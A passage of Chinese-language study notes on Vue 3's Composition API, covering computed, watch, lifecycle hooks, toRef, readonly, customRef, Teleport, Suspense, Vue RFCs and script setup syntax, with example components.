   -  reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。
-  从使用角度对比：
   -  ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong>```.value```，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong>```.value```。
   -  reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong>```.value```。

#### 2.计算属性(computed函数)

- 与Vue2.x中computed配置功能一致

- 写法

  ```vue
  <template>
  	<h1>一个人的信息</h1>
  	姓：<input type="text" v-model="person.firstName">
  	<br>
  	名：<input type="text" v-model="person.lastName">
  	<br>
  	<span>全名：{{person.fullName}}</span>
  	<br>
  	全名：<input type="text" v-model="person.fullName">
  </template>
  
  <script>
  	import {reactive,computed} from 'vue'
  	export default {
  		name: 'Demo',
  		setup(){
  			//数据
  			let person = reactive({
  				firstName:'张',
  				lastName:'三'
  			})
  			//计算属性——简写（没有考虑计算属性被修改的情况）
  			/* person.fullName = computed(()=>{
  				return person.firstName + '-' + person.lastName
  			}) */
  
  			//计算属性——完整写法（考虑读和写）
  			person.fullName = computed({
  				get(){
  					return person.firstName + '-' + person.lastName
  				},
  				set(value){
  					const nameArr = value.split('-')
  					person.firstName = nameArr[0]
  					person.lastName = nameArr[1]
  				}
  			})
  
  			//返回一个对象（常用）
  			return {
  				person
  			}
  		}
  	}
  </script>
  ```

#### 3.监视属性(watch函数)

- 与Vue2.x中watch配置功能一致

- 两个小“坑”：

  - 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
  - 监视reactive定义的响应式数据中某个属性时：deep配置有效。

  ```js
  //情况一：监视ref定义的响应式数据
  watch(sum,(newValue,oldValue)=>{
  	console.log('sum变化了',newValue,oldValue)
  },{immediate:true})
  
  //情况二：监视多个ref定义的响应式数据
  watch([sum,msg],(newValue,oldValue)=>{
  	console.log('sum或msg变化了',newValue,oldValue)
  }) 
  
  /* 情况三：监视reactive定义的响应式数据
  			若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
  			若watch监视的是reactive定义的响应式数据，则强制开启了深度监视, 默认就开启了
  */
  watch(person,(newValue,oldValue)=>{
  	console.log('person变化了',newValue,oldValue)
  },{immediate:true,deep:false}) //此处的deep配置不再奏效
  
  //情况四：监视reactive定义的响应式数据中的某个属性
  watch(()=>person.job,(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true}) 
  
  //情况五：监视reactive定义的响应式数据中的某些属性
  watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true})
  
  //特殊情况
  watch(()=>person.job,(newValue,oldValue)=>{
      console.log('person的job变化了',newValue,oldValue)
  },{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
  ```

示例:

```vue
<template>
	<h2>当前求和为：{{sum}}</h2>
	<button @click="sum++">点我+1</button>
	<hr>
	<h2>当前的信息为：{{msg}}</h2>
	<button @click="msg+='！'">修改信息</button>
	<hr>
	<h2>姓名：{{person.name}}</h2>
	<h2>年龄：{{person.age}}</h2>
	<h2>薪资：{{person.job.j1.salary}}K</h2>
	<button @click="person.name+='~'">修改姓名</button>
	<button @click="person.age++">增长年龄</button>
	<button @click="person.job.j1.salary++">涨薪</button>
</template>

<script>
	import {ref,reactive,watch} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let msg = ref('你好啊')
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})

			//情况一：监视ref所定义的一个响应式数据
			/* watch(sum,(newValue,oldValue)=>{
				console.log('sum变了',newValue,oldValue)
			},{immediate:true}) */

			//情况二：监视ref所定义的多个响应式数据
			/* watch([sum,msg],(newValue,oldValue)=>{
				console.log('sum或msg变了',newValue,oldValue)
			},{immediate:true}) */


			/* 
				情况三：监视reactive所定义的一个响应式数据的全部属性
						1.注意：此处无法正确的获取oldValue
						2.注意：强制开启了深度监视（deep配置无效,默认就开启了）
			*/
			/* watch(person,(newValue,oldValue)=>{
				console.log('person变化了',newValue,oldValue)
			},{deep:false}) //此处的deep配置无效 */

			//情况四：监视reactive所定义的一个响应式数据中的某个属性
			/* watch(()=>person.name,(newValue,oldValue)=>{
				console.log('person的name变化了',newValue,oldValue)
			})  */

			//情况五：监视reactive所定义的一个响应式数据中的某些属性
			/* watch([()=>person.name,()=>person.age],(newValue,oldValue)=>{
				console.log('person的name或age变化了',newValue,oldValue)
			})  */

			//特殊情况
			/* watch(()=>person.job,(newValue,oldValue)=>{
				console.log('person的job变化了',newValue,oldValue)
			},{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效 */


			//返回一个对象（常用）
			return {
				sum,
				msg,
				person
			}
		}
	}
</script>
```

#### 3.watchEffect函数(同时监听多个属性)

> 类似计算属性,同时监听多个属性

- watch的套路是：**既要指明监视的属性，也要指明监视的回调。**

- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。

- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

  ```js
  //watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
  watchEffect(()=>{
      const x1 = sum.value
      const x2 = person.age
      console.log('watchEffect配置的回调执行了')
  })
  ```

示例:

```vue
<template>
	<h2>当前求和为：{{sum}}</h2>
	<button @click="sum++">点我+1</button>
	<hr>
	<h2>当前的信息为：{{msg}}</h2>
	<button @click="msg+='！'">修改信息</button>
	<hr>
	<h2>姓名：{{person.name}}</h2>
	<h2>年龄：{{person.age}}</h2>
	<h2>薪资：{{person.job.j1.salary}}K</h2>
	<button @click="person.name+='~'">修改姓名</button>
	<button @click="person.age++">增长年龄</button>
	<button @click="person.job.j1.salary++">涨薪</button>
</template>
/*
- watch的套路是： 既要指明监视的属性，也要指明监视的回调。

- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。

- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。
 */
<script>
	import {ref,reactive,watch,watchEffect} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let msg = ref('你好啊')
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})

			//监视
			/* watch(sum,(newValue,oldValue)=>{
				console.log('sum的值变化了',newValue,oldValue)
			},{immediate:true}) */
            
			// 表示 sum.value 和 person.job.j1.salary变了都走这个逻辑
			watchEffect(()=>{
				const x1 = sum.value
				const x2 = person.job.j1.salary
				console.log('watchEffect所指定的回调执行了')
			})

			//返回一个对象（常用）
			return {
				sum,
				msg,
				person
			}
		}
	}
</script>
```

#### 4. const关键字

**①在 Vue 3 中，`const` 是 JavaScript 中的一个关键字，用于声明常量。使用 `const` 声明的变量必须进行初始化，并且一旦被赋值，就不能再被重新赋值。**

例如：

```vue
const myConstant = 42;
```

在这个例子中，`myConstant` 被声明为一个常量，其值为 42。试图在之后的代码中重新赋值给 `myConstant` 将会导致错误。

**②在 Vue 3 的 Composition API 中，`const` 主要用于声明响应式数据、计算属性、方法等，以及用于解构对象或数组。**

例如：

```vue
import { ref, reactive, computed } from 'vue';

// 声明响应式数据
const count = ref(0);

// 声明响应式对象
const user = reactive({
  name: 'John',
  age: 25,
});

// 声明计算属性
const doubledCount = computed(() => count.value * 2);

// 声明方法
const increment = () => {
  count.value++;
};
```

在上述例子中，`const` 被用于声明变量，但这些变量是响应式的，因为它们是通过 Vue 3 提供的 `ref`、`reactive` 和 `computed` 等函数创建的。这些函数确保了数据的响应性，使得当数据发生变化时，相关的视图会得到更新。

### 6.生命周期

- Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：
  - ```beforeDestroy```改名为 ```beforeUnmount```
  - ```destroyed```改名为 ```unmounted```
- Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：
  - `beforeCreate` ===> `setup()`
  - `created`=======>`setup()`
  - `beforeMount` ===>`onBeforeMount`
  - `mounted`=======>`onMounted`
  - `beforeUpdate`===>`onBeforeUpdate`
  - `updated` =======>`onUpdated`
  - `beforeUnmount` ==>`onBeforeUnmount`
  - `unmounted` =====>`onUnmounted`

```vue
<template>
	<h2>当前求和为：{{sum}}</h2>
	<button @click="sum++">点我+1</button>
</template>

<script>
	import {ref,onBeforeMount,onMounted,onBeforeUpdate,onUpdated,onBeforeUnmount,onUnmounted} from 'vue'
	export default {
		name: 'Demo',
		
		setup(){
			console.log('---setup---')
			//数据
			let sum = ref(0)

			//通过组合式API的形式去使用生命周期钩子
			onBeforeMount(()=>{
				console.log('---onBeforeMount---')
			})
			onMounted(()=>{
				console.log('---onMounted---')
			})
			onBeforeUpdate(()=>{
				console.log('---onBeforeUpdate---')
			})
			onUpdated(()=>{
				console.log('---onUpdated---')
			})
			onBeforeUnmount(()=>{
				console.log('---onBeforeUnmount---')
			})
			onUnmounted(()=>{
				console.log('---onUnmounted---')
			})

			//返回一个对象（常用）
			return {sum}
		},
		//通过配置项的形式使用生命周期钩子
		//#region 
		beforeCreate() {
			console.log('---beforeCreate---')
		},
		created() {
			console.log('---created---')
		},
		beforeMount() {
			console.log('---beforeMount---')
		},
		mounted() {
			console.log('---mounted---')
		},
		beforeUpdate(){
			console.log('---beforeUpdate---')
		},
		updated() {
			console.log('---updated---')
		},
		beforeUnmount() {
			console.log('---beforeUnmount---')
		},
		unmounted() {
			console.log('---unmounted---')
		},
		//#endregion
	}
</script>
```

**新增的钩子函数**

除了和 2.x 生命周期等效项之外，组合式 API 还提供了以下调试钩子函数：

- `onRenderTracked`
- `onRenderTriggered`

两个钩子函数都接收一个 `DebuggerEvent`，与 `watchEffect` 参数选项中的 `onTrack` 和 `onTrigger` 类似：

```javascript
export default {
  onRenderTriggered(e) {
    debugger
    // 检查哪个依赖性导致组件重新渲染
  },
}
```

## 自定义hook函数

- 本质是一个函数，把setup函数中使用的Composition API进行了封装。

- **类似于vue2.x中的mixin**。(把公有部分单独写)

- 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。

```js
import {reactive,onMounted,onBeforeUnmount} from 'vue'  // 引入
export default function (){
	//实现鼠标“打点”相关的数据
	let point = reactive({
		x:0,
		y:0
	})

	//实现鼠标“打点”相关的方法
	function savePoint(event){
		point.x = event.pageX
		point.y = event.pageY
		console.log(event.pageX,event.pageY)
	}

	//实现鼠标“打点”相关的生命周期钩子
	onMounted(()=>{
		window.addEventListener('click',savePoint)   //增加事件,调用函数savePoint
	})

	onBeforeUnmount(()=>{
		window.removeEventListener('click',savePoint) //移除事件
	})

	return point
}
```



## toRef

- 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。(**相当于引用**)
- 语法：```const name = toRef(person,'name')```
- 应用:   要将响应式对象中的某个属性单独提供给外部使用时。


- 扩展：```toRefs``` 与```toRef```功能一致，但可以批量创建多个 ref 对象，语法：```toRefs(person)```

```vue
// 报错
 const name1 = person.name
 name1 = "jj"
 console.log('%%%',name1)

// ok
 const name2 = toRef(person,'name')
 name2 = "jj"
 console.log('####',name2)
//-----------------------------------------

// 配合return使用
//返回一个对象（常用）
return {
person,
name:toRef(person,'name'),
age:toRef(person,'age'),
salary:toRef(person.job.j1,'salary'),

//返回对象引用, 也可以直接person
...toRefs(person)
}
```

## 组件间通信

### props + setup的参数

setup支持接收参数，第一个参数是props，接收来自父组件的传值。

## 其它 Composition API

### 1.shallowReactive 与 shallowRef

- shallowReactive：只处理对象最外层属性的响应式（浅响应式）。只考虑第一层数据的响应式
- shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。
- 什么时候使用?
  -  如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive。
  -  如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===> shallowRef。

### 2.readonly 与 shallowReadonly

- readonly: 让一个响应式数据变为只读的（深只读）。(相当于const)
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。

```vue
<template>
	<h4>当前求和为：{{sum}}</h4>
	<button @click="sum++">点我++</button>
	<hr>
	<h2>姓名：{{name}}</h2>
	<h2>年龄：{{age}}</h2>
	<h2>薪资：{{job.j1.salary}}K</h2>
	<button @click="name+='~'">修改姓名</button>
	<button @click="age++">增长年龄</button>
	<button @click="job.j1.salary++">涨薪</button>
</template>
/*
- readonly: 让一个响应式数据变为只读的（深只读）。
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。
*/ 
<script>
	import {ref,reactive,toRefs,readonly,shallowReadonly} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})

			//让一个响应式数据变为只读的（深只读）
			person = readonly(person)
			// person = shallowReadonly(person)
			// sum = readonly(sum)
			// sum = shallowReadonly(sum)

			//返回一个对象（常用）
			return {
				sum,
				...toRefs(person)
			}
		}
	}
</script>


```

### 3.toRaw 与 markRaw

**响应式对象转为普通对象**

- toRaw：
  - 作用：将一个由```reactive```生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。

```vue
<template>
	<h4>当前求和为：{{sum}}</h4>
	<button @click="sum++">点我++</button>
	<hr>
	<h2>姓名：{{name}}</h2>
	<h2>年龄：{{age}}</h2>
	<h2>薪资：{{job.j1.salary}}K</h2>
	<h3 v-show="person.car">座驾信息：{{person.car}}</h3>
	<button @click="name+='~'">修改姓名</button>
	<button @click="age++">增长年龄</button>
	<button @click="job.j1.salary++">涨薪</button>
	<button @click="showRawPerson">输出最原始的person</button>
	<button @click="addCar">给人添加一台车</button>
	<button @click="person.car.name+='!'">换车名</button>
	<button @click="changePrice">换价格</button>
</template>
/*
响应式对象转为普通对象
- toRaw：
  - 作用：将一个由```reactive```生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。
*/
<script>
	import {ref,reactive,toRefs,toRaw,markRaw} from 'vue'
	export default {
		name: 'Demo',
		setup(){
			//数据
			let sum = ref(0)
			let person = reactive({
				name:'张三',
				age:18,
				job:{
					j1:{
						salary:20
					}
				}
			})

			function showRawPerson(){
				// 效果person.age不会变化
				const p = toRaw(person)
				p.age++
				console.log(p)
			}

			function addCar(){
				let car = {name:'奔驰',price:40}
				// person.car = xxx 添加一个car属性
				person.car = markRaw(car)  //标记一个对象，使其永远不会再成为响应式对象。
			}

			function changePrice(){
				person.car.price++
				console.log(person.car.price)
			}

			//返回一个对象（常用）
			return {
				sum,
				person,             // 
				...toRefs(person),  // 调用的时候person没有car属性,可以在前面再写个person也可以直接先去定义一个空属性
				showRawPerson,
				addCar,
				changePrice
			}
		}
	}
</script>


```



### 4.customRef

- 作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。

- 实现防抖效果：

  ```vue
  <template>
  	<input type="text" v-model="keyword">
  	<h3>{{keyword}}</h3>
  </template>
  
  <script>
  	import {ref,customRef} from 'vue'
  	export default {
  		name:'Demo',
  		setup(){
  			// let keyword = ref('hello') //使用Vue准备好的内置ref
  			//自定义一个myRef
  			function myRef(value,delay){
  				let timer
  				//通过customRef去实现自定义
  				return customRef((track,trigger)=>{
  					return{
  						get(){
  							track() //告诉Vue这个value值是需要被“追踪”的
  							return value
  						},
  						set(newValue){
  							clearTimeout(timer)
  							timer = setTimeout(()=>{
  								value = newValue
  								trigger() //告诉Vue去更新界面
  							},delay)
  						}
  					}
  				})
  			}
  			let keyword = myRef('hello',500) //使用程序员自定义的ref
  			return {
  				keyword
  			}
  		}
  	}
  </script>
  ```


### 5.pr3ovide 与 inject

- 作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信

- 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据

- 具体写法：

  1. 祖组件中：

     ```js
     setup(){
     	......
         //父组件有一个 `provide` 选项来提供数据
         let car = reactive({name:'奔驰',price:'40万'})
         provide('car',car)
         ......
     }
     ```

  2. 后代组件中：

     ```js
     setup(props,context){
     	......
         //后代组件有一个 `inject` 选项来开始使用这些数据
         const car = inject('car')
         return {car}
     	......
     }
     ```

### 6.判断是否是响应式数据api

- isRef: 检查一个值是否为一个 ref 对象
- isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
- isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
- isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

```vue
<template>
	<h3>我是App组件</h3>
</template>

<script>
	import {ref, reactive,toRefs,readonly,isRef,isReactive,isReadonly,isProxy } from 'vue'
	export default {
		name:'App',
		setup(){
			let car = reactive({name:'奔驰',price:'40W'})
			let sum = ref(0)
			let car2 = readonly(car)

			console.log(isRef(sum))
			console.log(isReactive(car))
			console.log(isReadonly(car2))
			console.log(isProxy(car))
			console.log(isProxy(sum))

			
			return {...toRefs(car)}
		}
	}
</script>

<style>
	.app{
		background-color: gray;
		padding: 10px;
	}
</style>
```



## 四、Composition API 的优势

### 1.Options API 存在的问题

使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。

<div style="width:600px;height:370px;overflow:hidden;float:left">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f84e4e2c02424d9a99862ade0a2e4114~tplv-k3u1fbpfcp-watermark.image" style="width:600px;float:left" />
</div>
<div style="width:300px;height:370px;overflow:hidden;float:left">
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5ac7e20d1784887a826f6360768a368~tplv-k3u1fbpfcp-watermark.image" style="zoom:50%;width:560px;left" /> 
</div>







































### 2.Composition API 的优势

我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。

<div style="width:500px;height:340px;overflow:hidden;float:left">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bc0be8211fc54b6c941c036791ba4efe~tplv-k3u1fbpfcp-watermark.image"style="height:360px"/>
</div>
<div style="width:430px;height:340px;overflow:hidden;float:left">
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6cc55165c0e34069a75fe36f8712eb80~tplv-k3u1fbpfcp-watermark.image"style="height:360px"/>
</div>



































## 五、新的组件

### 1.Fragment

- 在Vue2中: 组件必须有一个根标签
- 在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中
- 好处: 减少标签层级, 减小内存占用

### 2.Teleport

-  `Teleport` 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。

  ```vue
  <teleport to="移动位置">
  	<div v-if="isShow" class="mask">
  		<div class="dialog">
  			<h3>我是一个弹窗</h3>
  			<button @click="isShow = false">关闭弹窗</button>
  		</div>
  	</div>
  </teleport>
  ```

#### 概述

在实际开发中，可能会遇到这样一个问题：某个组件包含在一个容器中，其宽高依赖于容器的宽高。而实际情况并不需要依赖于父容器，而是依赖于更高层级的容器。

先看一个容器：

```vue
<template>
<div class="box">
  <TeleportView></TeleportView>
</div>
</template>

<script setup>
import TeleportView from '../components/TeleportView.vue'
</script>

<style lang="stylus">
.box {
  width: 400px;
  height: 100px;
  position: relative;
}
</style>
```

一个名为 `.box` 的容器包裹着一个名为 `TeleportView` 的组件，并且 `.box` 设置为相对定位，含有宽高。

#### 不使用Teleport

以下为子组件`TeleportView`的内容，这个示例下没有使用 `Teleport` ：

```vue
<template>
  <button @click="modalOpen = true">
      Open full screen modal!
  </button>

  <div v-if="modalOpen" class="modal">
    <div>
      I'm a modal!
      <button @click="modalOpen = false">
        Close
    	</button>
    </div>
  </div>
</template>

<script setup>
ref: modalOpen = false
</script>

<style>
.modal {
  position: absolute;
  top: 0; right: 0; bottom: 0; left: 0;
  background-color: rgba(0,0,0,.5);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.modal div {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background-color: white;
  width: 300px;
  height: 300px;
  padding: 5px;
}
</style>
```

从效果可以看到， `.box` 的宽高限制了`TeleportView`的显示范围：

![GIF (4)](vue%E7%AC%94%E8%AE%B02.0.assets/GIF%20(4).gif)

#### 使用Teleport

使用了Teleport的版本如下：

```vue
<template>
  <button @click="modalOpen = true">
      Open full screen modal!
  </button>

  <teleport to="body">
    <div v-if="modalOpen" class="modal">
      <div>
        I'm a modal!
        <button @click="modalOpen = false">
          Close
        </button>
      </div>
    </div>
  </teleport>
</template>

<script setup>
ref: modalOpen = false
</script>

<style>
.modal {
  position: absolute;
  top: 0; right: 0; bottom: 0; left: 0;
  background-color: rgba(0,0,0,.5);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.modal div {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background-color: white;
  width: 300px;
  height: 300px;
  padding: 5px;
}
</style>
```

以上，将模态框用 `teleport` 包裹，并将其附着于 `body` 。

效果如下：

![GIF (5)](vue%E7%AC%94%E8%AE%B02.0.assets/GIF%20(5).gif)在CodePen中查看效果：[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/MWjeOBd)

### 3.Suspense

- 等待异步组件时渲染一些额外内容，让应用有更好的用户体验

- 使用步骤：

  - 异步引入组件

    ```js
    import {defineAsyncComponent} from 'vue'
    const Child = defineAsyncComponent(()=>import('./components/Child.vue'))
    ```

  - 使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback```

    ```vue
    <template>
    	<div class="app">
    		<h3>我是App组件</h3>
    		<Suspense>
    			<template v-slot:default>
    				<Child/>
    			</template>
    			<template v-slot:fallback>
    				<h3>加载中.....</h3>
    			</template>
    		</Suspense>
    	</div>
    </template>
    ```

具体看案例

```vue
<template>
	<div class="app">
		<h3>我是App组件</h3>
		<!--2. 格式不变:  使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback``` -->
		<Suspense>
			<template v-slot:default>
				<Child/>
			</template>
			<template v-slot:fallback>
				<h3>稍等，加载中...</h3>
			</template>
		</Suspense>
	</div>
</template>
/*
1. 等待异步组件时渲染一些额外内容，让应用有更好的用户体验
*/ 
<script>
	// import Child from './components/Child'//静态引入
	// 异步引入组件
	import {defineAsyncComponent} from 'vue' 
	const Child = defineAsyncComponent(()=>import('./components/Child')) //异步引入
	export default {
		name:'App',
		components:{Child},
	}
</script>

<style>
	.app{
		background-color: gray;
		padding: 10px;
	}
</style>
```

不用非得用async setup(){},这里只是测试

```vue
<template>
	<div class="child">
		<h3>我是Child组件</h3>
		{{sum}}
	</div>
</template>

<script>
	import {ref} from 'vue'
	export default {
		name:'Child',
		// async 表示异步
		async setup(){
			let sum = ref(0)
			let p = new Promise((resolve,reject)=>{
				setTimeout(()=>{
					resolve({sum})
				},3000)
			})
			// await 等待p成功的结果
			return await p
		}
	}
</script>

<style>
	.child{
		background-color: skyblue;
		padding: 10px;
	}
</style>
```



## 六、其他

### 1.全局API的转移

- Vue 2.x 有许多全局 API 和配置。

  - 例如：注册全局组件、注册全局指令等。

    ```js
    //注册全局组件
    Vue.component('MyButton', {
      data: () => ({
        count: 0
      }),
      template: '<button @click="count++">Clicked {{ count }} times.</button>'
    })
    
    //注册全局指令
    Vue.directive('focus', {
      inserted: el => el.focus()
    }
    ```

- Vue3.0中对这些API做出了调整：

  - 将全局的API，即：```Vue.xxx```调整到应用实例（```app```）上

    | 2.x 全局 API（```Vue```） | 3.x 实例 API (`app`)                        |
    | ------------------------- | ------------------------------------------- |
    | Vue.config.xxxx           | app.config.xxxx                             |
    | Vue.config.productionTip  | <strong style="color:#DD5145">移除</strong> |
    | Vue.component             | app.component                               |
    | Vue.directive             | app.directive                               |
    | Vue.mixin                 | app.mixin                                   |
    | Vue.use                   | app.use                                     |
    | Vue.prototype             | app.config.globalProperties                 |

### 2.其他改变

- data选项应始终被声明为一个函数。

- 过度类名的更改：

  - Vue2.x写法

    ```css
    .v-enter,
    .v-leave-to {
      opacity: 0;
    }
    .v-leave,
    .v-enter-to {
      opacity: 1;
    }
    ```

  - Vue3.x写法

    ```css
    .v-enter-from,
    .v-leave-to {
      opacity: 0;
    }
    
    .v-leave-from,
    .v-enter-to {
      opacity: 1;
    }
    ```

- <strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持```config.keyCodes```

- <strong style="color:#DD5145">移除</strong>```v-on.native```修饰符

  - 父组件中绑定事件

    ```vue
    <my-component
      v-on:close="handleComponentEvent"
      v-on:click="handleNativeClickEvent"
    />
    ```

  - 子组件中声明自定义事件

    ```vue
    <script>
      export default {
        emits: ['close']
      }
    </script>
    ```

- <strong style="color:#DD5145">移除</strong>过滤器（filter）

  > 过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。

- ......





## RFC搜集.md

本文搜集了一些非常不错的RFC，有可能实现了，也有可能没有实现，大部分在本文编写时还未实现，以官方RFC为主：[Vue RFCs](https://github.com/vuejs/rfcs)。
<a name="JknjD"></a>

### style-variables

可以在css中使用js变量，方便通过js动态修改样式。

[第一阶段的提案](https://github.com/vuejs/rfcs/blob/style-vars/active-rfcs/0000-sfc-style-variables.md)：

```vue
<template>
  <div class="text">hello</div>
</template>

<script>
export default {
  data() {
    return {
      color: 'red'
    }
  }
}
</script>

<style vars="{ color }">
.text {
  color: var(--color);
}
</style>
```

[第二阶段的提案](https://github.com/vuejs/rfcs/blob/style-vars-2/active-rfcs/0000-sfc-style-variables.md)：State-driven CSS Variable Injection in `<style>`

```vue
<template>
  <div class="text">hello</div>
</template>

<script>
  export default {
    data() {
      return {
        color: 'red',
        font: {
          size: '2em',
        },
      }
    },
  }
</script>

<style>
  .text {
    color: v-bind(color);

    /* expressions (wrap in quotes) */
    font-size: v-bind('font.size');
  }
</style>
```

<a name="FHZfz"></a>

### script setup & ref sugar

将setup暴露到script级别，直接暴露顶级变量，不需要写 `export default` ，减少代码量。

```vue
<script setup>
// imported components are also directly usable in template
import Foo from './Foo.vue'
import { ref } from 'vue'

// write Composition API code just like in a normal setup()
// but no need to manually return everything
const count = ref(0)
const inc = () => { count.value++ }
</script>

<template>
  <Foo :count="count" @click="inc" />
</template>
```

ref语法糖示例：

```vue
<script setup>
// declaring a variable that compiles to a ref
ref: count = 1

function inc() {
  // the variable can be used like a plain value
  count++
}

// access the raw ref object by prefixing with $
console.log($count.value)
</script>

<template>
  <button @click="inc">{{ count }}</button>
</template>
```

详见：

- [script-setup](https://github.com/vuejs/rfcs/blob/script-setup/active-rfcs/0000-script-setup.md)
- [sfc-script-setup](https://github.com/vuejs/rfcs/blob/sfc-improvements/active-rfcs/0000-sfc-script-setup.md)
- [New script setup and ref sugar](https://github.com/vuejs/rfcs/pull/222)
- [SFC Improvements](https://github.com/vuejs/rfcs/pull/182)
- [New `<script setup>` and ref sugar implementation](https://github.com/vuejs/vue-next/pull/2532)
- [Reactivity Transform · Discussion #369 · vuejs/rfcs](https://github.com/vuejs/rfcs/discussions/369)

<a name="UeCDN"></a>

### deep selectors in style scoped

以前在Vue中使用 `/deep/` 也可做穿透选择器，在Vue3中增强了这一特性，包括如下选择器：

```vue
<style scoped>
/* deep selectors */
::v-deep(.foo) {}
/* shorthand */
:deep(.foo) {}

/* targeting slot content */
::v-slotted(.foo) {}
/* shorthand */
:slotted(.foo) {}

/* one-off global rule */
::v-global(.foo) {}
/* shorthand */
:global(.foo) {}
</style>
```

详见：

- [scoped-styles-changes](https://github.com/vuejs/rfcs/blob/master/active-rfcs/0023-scoped-styles-changes.md)

### props sugar

参考：

- [prop sugar](https://github.com/vuejs/rfcs/issues/229)

### vite：Pug support

# script setup语法糖:crossed_swords:

它是 Vue3 的一个新语法糖，在 `setup` 函数中，所有 ES 模块导出都被认为是暴露给上下文的值，并包含在 setup() 返回对象中。相对之前的写法，语法更简单。

## BEFORE

```vue
<script>
import { defineComponent } from 'vue'
export default defineComponent({
  setup(props, context) {
    // 在这里声明数据，或者编写函数并在这里执行它
    return {
      // 需要给 `<template />` 用的数据或函数，在这里 `return` 出去
    }
  },
})
</script>
```

## NOW

```vue
<script setup>
...
</script>
```

### 一、推荐使用箭头函数

```js
// 普通函数
const sum = function(a, b) {
	return a + b;
}

// 箭头函数
const sum1 = (a, b) => {
	return a + b;
}
```

### 二、自动注册属性和方法, 无需返回，直接使用

例子1

```vue
<template>
<div>{{count}}</div>
<button @click="inc">增加</button>
<button @click="dec">减少</button>
</template>

<script setup>
import { ref } from 'vue'

const count = ref(0)
const inc = () => { count.value++ }
const dec = () => { count.value-- }
</script>
```

